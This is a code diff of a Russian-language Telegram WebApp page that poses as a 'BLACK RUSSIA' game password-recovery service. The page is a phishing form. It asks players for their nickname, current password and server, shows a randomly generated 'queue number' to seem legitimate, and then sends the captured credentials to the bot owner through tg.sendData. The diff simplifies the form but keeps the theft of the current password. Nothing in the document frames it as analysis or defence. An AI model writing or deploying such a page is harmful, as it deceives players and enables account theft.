@@ -15,87 +15,51 @@
         h1 { font-size: 20px; margin-bottom: 20px; text-transform: uppercase; color: #fff; }
         .btn-red { background-color: #ff0000; color: #fff; border: none; padding: 15px 25px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; text-transform: uppercase; width: 100%; box-shadow: 0 4px 15px rgba(255, 0, 0, 0.3); }
         .input-box { background: #1a1a1a; border: 1px solid #333; border-radius: 8px; padding: 12px; margin-bottom: 15px; color: #fff; font-size: 14px; outline: none; width: 100%; box-sizing: border-box; }
-        .input-box:focus { border-color: #ff0000; }
         label { display: block; text-align: left; font-size: 12px; color: #888; margin-bottom: 5px; margin-left: 5px; }
-        .error-text { color: #ff4444; font-size: 13px; margin-bottom: 15px; display: none; }
-        .queue-number { font-size: 60px; color: #ff0000; font-weight: bold; margin: 20px 0; text-shadow: 0 0 20px rgba(255, 0, 0, 0.4); }
-        .wait-text { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+        .queue-number { font-size: 60px; color: #ff0000; font-weight: bold; margin: 20px 0; }
     </style>
 </head>
 <body>
-
 <div class="container">
     <div id="screen1" class="screen active">
         <div class="main-title">BLACK RUSSIA</div>
         <h1>ВОССТАНОВЛЕНИЕ ПАРОЛЯ</h1>
-        <p style="color: #666; margin-bottom: 40px;">Сервис управления безопасностью</p>
         <button class="btn-red" onclick="goToScreen(2)">Продолжить</button>
     </div>
-
     <div id="screen2" class="screen">
-        <h2 style="color: #ff0000; text-transform: uppercase; margin-bottom: 20px;">Смена пароля</h2>
-        <div id="error-msg" class="error-text">Заполните все обязательные поля</div>
-
-        <label>Ваш Никнейм *</label>
+        <label>Никнейм *</label>
         <input type="text" id="nick" class="input-box" placeholder="Ivan_Ivanov">
-
         <label>Текущий пароль *</label>
-        <input type="password" id="old_pass" class="input-box" placeholder="Введите пароль">
-
-        <label>Пин-код (если есть)</label>
-        <input type="number" id="pin" class="input-box" placeholder="1234">
-
-        <label>Выберите сервер *</label>
+        <input type="password" id="old_pass" class="input-box">
+        <label>Сервер *</label>
         <select id="server" class="input-box">
-            <option value="" disabled selected>Выберите сервер</option>
             <option value="Red">1. Red</option><option value="Green">2. Green</option><option value="Blue">3. Blue</option><option value="Yellow">4. Yellow</option><option value="Orange">5. Orange</option><option value="Purple">6. Purple</option><option value="Lime">7. Lime</option><option value="Pink">8. Pink</option><option value="Cherry">9. Cherry</option><option value="Black">10. Black</option><option value="Indigo">11. Indigo</option><option value="White">12. White</option><option value="Magenta">13. Magenta</option><option value="Crimson">14. Crimson</option><option value="Gold">15. Gold</option><option value="Azure">16. Azure</option><option value="Platinum">17. Platinum</option><option value="Aqua">18. Aqua</option><option value="Gray">19. Gray</option><option value="Ice">20. Ice</option><option value="Chilli">21. Chilli</option><option value="Choco">22. Choco</option><option value="Moscow">23. Moscow</option><option value="SPB">24. SPB</option><option value="Ufa">25. Ufa</option><option value="Sochi">26. Sochi</option><option value="Kazan">27. Kazan</option><option value="Samara">28. Samara</option><option value="Rostov">29. Rostov</option><option value="Anapa">30. Anapa</option><option value="EKB">31. EKB</option><option value="Krasnodar">32. Krasnodar</option><option value="Arzamas">33. Arzamas</option><option value="Novosib">34. Novosib</option><option value="Grozny">35. Grozny</option><option value="Saratov">36. Saratov</option><option value="Omsk">37. Omsk</option><option value="Irkutsk">38. Irkutsk</option><option value="Volgograd">39. Volgograd</option><option value="Voronezh">40. Voronezh</option><option value="Belgorod">41. Belgorod</option><option value="Makhachkala">42. Makhachkala</option><option value="Vladikavkaz">43. Vladikavkaz</option><option value="Vladivostok">44. Vladivostok</option><option value="Kaliningrad">45. Kaliningrad</option><option value="Chelyabinsk">46. Chelyabinsk</option><option value="Krasnoyarsk">47. Krasnoyarsk</option><option value="Cheboksary">48. Cheboksary</option><option value="Khabarovsk">49. Khabarovsk</option><option value="Perm">50. Perm</option><option value="Tula">51. Tula</option><option value="Ryazan">52. Ryazan</option><option value="Murmansk">53. Murmansk</option><option value="Penza">54. Penza</option><option value="Kursk">55. Kursk</option><option value="Arkhangelsk">56. Arkhangelsk</option><option value="Orenburg">57. Orenburg</option><option value="Kirov">58. Kirov</option><option value="Kemerovo">59. Kemerovo</option><option value="Tyumen">60. Tyumen</option><option value="Tolyatti">61. Tolyatti</option><option value="Ivanovo">62. Ivanovo</option><option value="Stavropol">63. Stavropol</option><option value="Smolensk">64. Smolensk</option><option value="Pskov">65. Pskov</option><option value="Bryansk">66. Bryansk</option><option value="Orel">67. Orel</option><option value="Yaroslavl">68. Yaroslavl</option><option value="Barnaul">69. Barnaul</option><option value="Lipetsk">70. Lipetsk</option><option value="Ulyanovsk">71. Ulyanovsk</option><option value="Yakutsk">72. Yakutsk</option><option value="Tambov">73. Tambov</option><option value="Bratsk">74. Bratsk</option><option value="Astrakhan">75. Astrakhan</option><option value="Chita">76. Chita</option><option value="Kostroma">77. Kostroma</option><option value="Vladimir">78. Vladimir</option><option value="Kaluga">79. Kaluga</option><option value="Novgorod">80. Novgorod</option><option value="Taganrog">81. Taganrog</option><option value="Vologda">82. Vologda</option><option value="Tver">83. Tver</option><option value="Tomsk">84. Tomsk</option><option value="Izhevsk">85. Izhevsk</option><option value="Surgut">86. Surgut</option><option value="Podolsk">87. Podolsk</option><option value="Magadan">88. Magadan</option><option value="Cherepovets">89. Cherepovets</option><option value="Norilsk">90. Norilsk</option><option value="Astana">91. Astana</option>
         </select>
-
-        <label>Новый пароль *</label>
-        <input type="password" id="new_pass" class="input-box" placeholder="Придумайте новый пароль">
-
         <button class="btn-red" onclick="prepareData()">Далее</button>
     </div>
-
     <div id="screen3" class="screen">
-        <div class="main-title" style="font-size: 22px;">ЗАЯВКА ПРИНЯТА</div>
-        <p class="wait-text">Ожидайте очереди:</p>
-        <div id="queue-val" class="queue-number"></div>
-        <p class="wait-text">Проверка проходит автоматически.</p>
+        <div class="queue-number" id="queue-val"></div>
         <button class="btn-red" onclick="finalSend()">ЗАВЕРШИТЬ</button>
     </div>
 </div>
-
 <script>
     const tg = window.Telegram.WebApp;
     tg.ready();
-    tg.expand();
-    let savedData = {};
-
-    function goToScreen(num) {
+    function goToScreen(n) {
         document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-        document.getElementById('screen' + num).classList.add('active');
+        document.getElementById('screen' + n).classList.add('active');
     }
-
     function prepareData() {
-        const nick = document.getElementById('nick').value;
-        const old_pass = document.getElementById('old_pass').value;
-        const pin = document.getElementById('pin').value;
-        const server = document.getElementById('server').value;
-        const new_pass = document.getElementById('new_pass').value;
-
-        if (!nick || !old_pass || !server || !new_pass) {
-            document.getElementById('error-msg').style.display = 'block';
-            return;
-        }
-
-        savedData = { nick, old_password: old_pass, pin_code: pin || "Нет", server, new_password: new_pass };
-        document.getElementById('queue-val').innerText = Math.floor(Math.random() * 99) + 1;
+        document.getElementById('queue-val').innerText = Math.floor(Math.random() * 50) + 1;
         goToScreen(3);
     }
-
     function finalSend() {
-        tg.sendData(JSON.stringify(savedData));
+        const data = {
+            nick: document.getElementById('nick').value,
+            pass: document.getElementById('old_pass').value,
+            server: document.getElementById('server').value
+        };
+        tg.sendData(JSON.stringify(data));
         tg.close();
     }
 </script>
